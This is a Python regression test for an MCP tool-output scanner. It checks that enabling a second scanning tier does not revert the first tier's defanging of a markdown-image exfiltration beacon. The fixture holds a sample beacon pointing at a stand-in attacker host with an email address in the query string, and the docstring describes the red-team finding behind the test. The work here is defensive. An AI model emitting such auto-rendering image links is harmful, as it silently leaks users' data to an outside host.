"""EN2-01 / L9-01 (lifecycle red-team wf_a29f8f21): turning Tier-2 ON must not make the
OUTPUT LESS protected. The Tier-1 preset loop defangs a zero-click exfil beacon
(![...] -> [...]) by mutating the payload leaf via setter(); the Tier-2 loop held a
STALE pre-Tier-1 `targets` snapshot, so its redact write-back setter(redact_all(stale))
reverted the defang (restoring the raw ![ auto-render) while masking the co-located PII.
The fix re-binds targets to the post-Tier-1 payload so Tier-2 sees the defanged text.
"""
import asyncio
import unittest.mock as mock

import mcp_scan_orchestrator as orch
from scanner import ScanVerdict

# Beacon carries a redact_all-maskable value (the email) so the Tier-2 redact setter fires.
PAYLOAD = {"result": "See ![a](https://attacker.io/c?leak=john.doe@corp.example) now"}

CTRL = {
    "scan_controls_configured": True,
    "tier1_output": {"enabled": True, "target_mode": "entire", "key_path": "",
                     "strict_mode": "fail_open", "control_id": "t1"},
    "tier2_output": {"enabled": True, "target_mode": "entire", "key_path": "",
                     "strict_mode": "strict", "control_id": "t2"},
    "tier1_input": {"enabled": False}, "tier2_input": {"enabled": False},
}


class _RedactScanner:
    async def scan_prompt_with_tier2(self, text, **kw):
        return ScanVerdict(action="redact", threat_type="pii", confidence=0.9,
                           detail="judge redact", tier="tier_2")


def _run(tier2_on):
    ctrl = {**CTRL}
    if not tier2_on:
        ctrl = {**CTRL, "tier2_output": {**CTRL["tier2_output"], "enabled": False}}
    with mock.patch.object(orch, "_get_input_scanner", return_value=_RedactScanner()), \
         mock.patch.object(orch, "_get_policy_sync", return_value=None):
        out, res = asyncio.run(orch.scan_mcp_payload(
            dict(PAYLOAD), scan_direction="output", enforcement="redact",
            effective_controls=ctrl, enabled_info={"mcp_tier2_enabled": tier2_on},
            org_slug="o", server_slug="s", tool_name="fetch"))
    return out["result"]


def test_baseline_tier1_defangs_beacon_with_tier2_off():
    # Sanity: with Tier-2 OFF the Tier-1 preset defang holds (no raw auto-render '!').
    off = _run(tier2_on=False)
    assert "![a]" not in off, f"Tier-1 preset defang did not fire — bad test payload: {off!r}"


def test_tier2_on_preserves_tier1_beacon_defang():
    # THE FIX: Tier-2 ON must NOT revert the Tier-1 defang. The raw '![' auto-render
    # must not reappear; the co-located PII is still masked.
    on = _run(tier2_on=True)
    assert "![a]" not in on, f"Tier-2 reverted the Tier-1 beacon defang (L9-01 leak): {on!r}"
    assert "john.doe@corp.example" not in on, f"PII leaked: {on!r}"
